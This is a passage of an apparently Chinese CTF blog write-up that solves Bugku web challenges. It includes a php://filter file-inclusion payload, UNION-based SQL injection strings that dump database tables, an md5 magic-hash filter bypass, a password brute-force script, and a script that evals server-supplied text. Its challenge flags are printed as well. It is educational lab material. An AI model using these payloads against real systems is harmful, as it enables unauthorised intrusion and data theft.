class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>跟上一题有点像，用到了正则匹配，参数args值必须是由[A-Za-z0-9]字符集组成，并且将args值作为新的变量输出然后eval函数执行</p><p>根据题目的提示，flag值是一个变量，然而这个变量并不在我们访问的php文件中有定义，所以我们可以猜测flag可能是一个全局变量，php的全局变量是$GLOBALS，所以可以给参数args赋值GLOBALS，就可以将全局变量输出出来</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/30.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>果然，flag就在里面</p><h3 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h3><p>网址：<a href="http://120.24.86.145:8002/web5/" target="_blank" rel="noopener">http://120.24.86.145:8002/web5/</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/31.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>看起来要提交一个表单</p><p>看一下源代码</p><p>发现一个隐藏的一串代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/32.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>查询知道这是一串JSFuck代码，是将js代码编译生成的一串长代码</p><p>放到<a href="http://www.bugku.com/tools/jsfuck/解码得到" target="_blank" rel="noopener">http://www.bugku.com/tools/jsfuck/解码得到</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/33.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h3><p>网址：<a href="http://120.24.86.145:9009/hd.php" target="_blank" rel="noopener">http://120.24.86.145:9009/hd.php</a></p><p>访问页面发现什么也没有，源代码也看不出什么</p><p>试着用burp抓包</p><p>在响应头部发现flag值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/34.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p>网址：<a href="http://120.24.86.145:8002/web4/" target="_blank" rel="noopener">http://120.24.86.145:8002/web4/</a></p><p>网页提示我们看一下源代码</p><p>发现一串被url加密的js代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="string">'%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62'</span>;</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="string">'%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b'</span>;</span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">unescape</span>(p1) + <span class="built_in">unescape</span>(<span class="string">'%35%34%61%61%32'</span> + p2));</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>解码后：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="string">'function checkSubmit()&#123;var a=document.getElementById("password");if("undefined"!=typeof a)&#123;if("67d709b2b'</span>;</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="string">'aa648cf6e87a7114f1"==a.value)return!0;alert("Error");a.focus();return!1&#125;&#125;document.getElementById("levelQuest").onsubmit=checkSubmit;'</span>;</span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">unescape</span>(p1)+<span class="built_in">unescape</span>(<span class="string">'54aa2'</span>+p2));</span><br></pre></td></tr></table></figure><p>拼接后eval函数执行的语句：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">"password"</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"undefined"</span> != <span class="keyword">typeof</span> a)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span> == a.value)&#123;</span><br><span class="line">                <span class="keyword">return</span> !<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            alert(<span class="string">"Error"</span>);</span><br><span class="line">            a.focus();</span><br><span class="line">            <span class="keyword">return</span> !<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"levelQuest"</span>).onsubmit = checkSubmit();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>大致逻辑就是输入拼接后的password：67d709b2b54aa2aa648cf6e87a7114f1得到flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/35.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h3><p>网址：<a href="http://120.24.86.145:8005/post/" target="_blank" rel="noopener">http://120.24.86.145:8005/post/</a></p><p>点击链接，发现跳转到?file=show.php，猜测是文件包含漏洞</p><p>根据题目提示，利用php内置协议读取index.php内容</p><p>输入?file=php://filter/read=convert.base64-encode/resource=index.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/36.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>得到一串base64加密的字符串，解密得index.php内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!$_GET[file])&#123;echo &apos;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&apos;;&#125;</span><br><span class="line">$file=$_GET[&apos;file&apos;];</span><br><span class="line">if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">echo &quot;Oh no!&quot;;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">include($file); </span><br><span class="line">//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>成功得到flag，同时可以看到过滤了关键词../,input,data</p><h3 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h3><p>网址：<a href="http://120.24.86.145:8002/baopo/" target="_blank" rel="noopener">http://120.24.86.145:8002/baopo/</a></p><p>提示我们输入正确的5位密码就能查看到flag，根据提示，直接写个脚本爆破密码就行，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/baopo/'</span></span><br><span class="line">pwd = <span class="string">'0'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">if</span> len(pwd) != <span class="number">5</span> :</span><br><span class="line">        add = <span class="number">5</span> - len(pwd)</span><br><span class="line">        addstr = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(add):</span><br><span class="line">            addstr = <span class="string">'0'</span> + addstr</span><br><span class="line">        pwd = addstr + pwd</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'pwd'</span>:pwd</span><br><span class="line">        &#125;</span><br><span class="line">    r = requests.post(url,data=data)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'密码不正确'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(pwd,<span class="string">': correct password!!!!!!!'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(pwd,<span class="string">': wrong password'</span>)</span><br><span class="line">        pwd = str(int(pwd)+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>爆破出的密码是13579</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/37.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h3><p>网址：<a href="http://120.24.86.145:9001/test/" target="_blank" rel="noopener">http://120.24.86.145:9001/test/</a></p><p>看提示是要点击一百万次才能拿到flag</p><p>仔细看看源代码的js部分</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(clicks &gt;= <span class="number">1000000</span>)&#123;</span><br><span class="line">         <span class="keyword">var</span> form = $(<span class="string">'&lt;form action="" method="post"&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;input type="text" name="clicks" value="'</span> + clicks + <span class="string">'" hidden/&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;/form&gt;'</span>);</span><br><span class="line">$(<span class="string">'body'</span>).append(form);</span><br><span class="line">form.submit();</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>可以看出当我们点击一百万次时会自动提交一个表单给服务器</p><p>那么我们可以直接发送POST请求提交参数clicks给服务器</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://120.24.86.145:9001/test/'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>data = &#123;</span><br><span class="line"><span class="string">'clicks'</span>:<span class="number">1000000</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url,data=data)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.encoding = r.apparent_encoding</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(r.text)</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    h1&#123;</span><br><span class="line">      color: white;</span><br><span class="line">      text-align: center;</span><br><span class="line">    &#125;</span><br><span class="line">    body&#123;</span><br><span class="line">      background-color: black;</span><br><span class="line">    &#125;</span><br><span class="line">    img&#123;</span><br><span class="line">      display: block;</span><br><span class="line">      margin: <span class="number">0</span> auto;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#flag&#123;</span></span><br><span class="line">    color: white;</span><br><span class="line">      text-align: center;</span><br><span class="line">      display: block;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span></span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span><br><span class="line">    &lt;script src="jquery-3.2.1.min.js"&gt;&lt;/script&gt;</span><br><span class="line">    &lt;title&gt;点击一百万次&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1 id="goal"&gt;Goal: &lt;span id="clickcount"&gt;0&lt;/span&gt;/1000000&lt;/h1&gt;</span><br><span class="line">    &lt;img id=<span class="string">"cookie"</span> src=<span class="string">"cookie.png"</span>&gt;</span><br><span class="line">    &lt;span id="flag"&gt;flag&#123;Not_C00kI3Cl1ck3r&#125;&lt;/span&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    var clicks=<span class="number">0</span></span><br><span class="line">    $(function() &#123;</span><br><span class="line">      $(<span class="string">"#cookie"</span>)</span><br><span class="line">        .mousedown(function() &#123;</span><br><span class="line">          $(this).width(<span class="string">'350px'</span>).height(<span class="string">'350px'</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        .mouseup(function() &#123;</span><br><span class="line">          $(this).width(<span class="string">'375px'</span>).height(<span class="string">'375px'</span>);</span><br><span class="line">          clicks++;</span><br><span class="line">          $(<span class="string">"#clickcount"</span>).text(clicks);</span><br><span class="line">          <span class="keyword">if</span>(clicks &gt;= <span class="number">1000000</span>)&#123;</span><br><span class="line">          var form = $(<span class="string">'&lt;form action="" method="post"&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;input type="text" name="clicks" value="'</span> + clicks + <span class="string">'" hidden/&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;/form&gt;'</span>);</span><br><span class="line">$(<span class="string">'body'</span>).append(form);</span><br><span class="line">form.submit();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>拿到了flag:flag{Not_C00kI3Cl1ck3r}</p><h3 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h3><p>网址：<a href="http://120.24.86.145:8002/web16/" target="_blank" rel="noopener">http://120.24.86.145:8002/web16/</a></p><p>进入页面只有一串看似加密过的长文d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e </p><p>尝试各种解密方法都不行，源代码也没有提示什么</p><p>回到题目名字：备份</p><p>经过查询得知 ：备份文件一般情况是在后缀名后加的.swp，.bak </p><p>于是输入url：<a href="http://120.24.86.145:8002/web16/index.php.bak" target="_blank" rel="noopener">http://120.24.86.145:8002/web16/index.php.bak</a></p><p>发现下载了备份文件，用编辑器打开</p><p>发现php代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017/8/6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);</span><br><span class="line">$str = substr($str,1);</span><br><span class="line">$str = str_replace(&apos;key&apos;,&apos;&apos;,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line">echo md5($key1);</span><br><span class="line"></span><br><span class="line">echo md5($key2);</span><br><span class="line">if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    echo $flag.&quot;取得flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看起来要绕过过滤拿到flag</p><p>先了解全局变量$_SERVER[‘REQUEST_URI’]它代表访问页面的URI</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = $_SERVER[<span class="string">'REQUEST_URI'</span>];</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/38.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>所以本题的$_SERVER[‘REQUEST_URI’]值为/web16/index.php?…</p><p>再经过strstr函数返回?后面的字符串，也就是get的参数</p><p>再通过substr函数返回各个参数，然后再通过str_replace函数将字符串中的’key’过滤</p><p>处理后再经由parse_str函数将查询字符串解析到变量中</p><p>如处理字符串”key1=1&amp;key2=2”，则创建变量key1=1,变量key2=2</p><p>然后判断如果变量key1和key2值不完全相等且md5加密后的两个值相等，则输出flag值</p><p>绕过str_replace函数方法很简单，双写即可绕过，md5加密后相等但本身不相等的两个值为240610708 和QNKCDZO </p><p>于是访问<a href="http://120.24.86.145:8002/web16/index.php?kkeyey1=240610708&amp;kkeyey2=QNKCDZO" target="_blank" rel="noopener">http://120.24.86.145:8002/web16/index.php?kkeyey1=240610708&amp;kkeyey2=QNKCDZO</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/39.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>拿到flag</p><h3 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h3><p>网址：<a href="http://120.24.86.145:8002/chengjidan/" target="_blank" rel="noopener">http://120.24.86.145:8002/chengjidan/</a></p><p>提交表单参数id=1,2,3时返回不同结果，提交id=1’无返回结果，明显存在sql注入漏洞</p><p>爆查询字段数：输入id=1’ order by 4 #有返回结果，输入id=1’ order by 5#无返回结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/40.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/41.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>所以查询字段数为4</p><p>爆当前库：输入id=0’ union select database(),2,3,4#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/42.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/43.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>当前库名为skctf_flag</p><p>爆当前库下的表名：输入id=0’ union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema=database()#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/44.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/45.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>表名为fl4g,sc</p><p>爆fl4g表下的列名：输入id=0’ union select group_concat(column_name),2,3,4 from information_schema.columns where table_name=’fl4g’#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/46.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/47.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>列名为skctf_flag</p><p>爆数据：输入id=0’ union select group_concat(skctf_flag),2,3,4 from skctf_flag.fl4g#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/48.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/49.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>拿到flag</p><h3 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h3><p>网址：<a href="http://120.24.86.145:8002/qiumingshan/" target="_blank" rel="noopener">http://120.24.86.145:8002/qiumingshan/</a></p><p>要求我们post一个value参数，值为页面的一串公式的计算结果，且每两秒会刷新一个新的公式</p><p>只能写脚本，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/qiumingshan/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    r = s.get(url)</span><br><span class="line">    match = re.search(<span class="string">r'&lt;div&gt;(.*)='</span>,r.text)</span><br><span class="line">    result = eval(match.group(<span class="number">1</span>))</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'value'</span>:str(result)</span><br><span class="line">        &#125;</span><br><span class="line">    r = s.post(url,data=data)</span><br><span class="line">    match = re.search(<span class="string">r'&lt;div&gt;(.*)='</span>,r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> match:</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(r.text)</span><br></pre></td></tr></table></figure><p>这里利用正则匹配出公式，利用eval函数计算出结果</p><p>测试得一定概率才能获得flag</p><h3 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h3><p>网址：<a href="http://120.24.86.145:8002/web6/" target="_blank" rel="noopener">http://120.24.86.145:8002/web6/</a></p><p>源代码提示post一个正确的margin参数给服务器就能拿到flag</p><p>用burp抓包发现响应头包含了flag字段，并且每次响应的flag字段值都不一样，猜测就是提交这个flag值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/50.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>第一次的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web6/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">flag = r.headers[<span class="string">'flag'</span>]</span><br><span class="line">print(<span class="string">'flag:'</span>,flag)</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"margin"</span>: flag</span><br><span class="line">&#125;</span><br><span class="line">r = s.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/51.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现不对，才发现还需要将flag字段值进行base64解码</p><p>第二次的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web6/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">flag = r.headers[<span class="string">'flag'</span>]</span><br><span class="line">flag = bytes.decode(base64.b64decode(flag)).split(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line">print(<span class="string">'flag:'</span>,flag)</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"margin"</span>: flag</span><br><span class="line">&#125;</span><br><span class="line">r = s.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/52.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>还是不对，借鉴了别人的代码才发现还得对上面的flag在进行一次base64解码，真是坑…</p><p>最后的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web6/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">flag = bytes.decode(base64.b64decode(r.headers[<span class="string">'flag'</span>])).split(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span 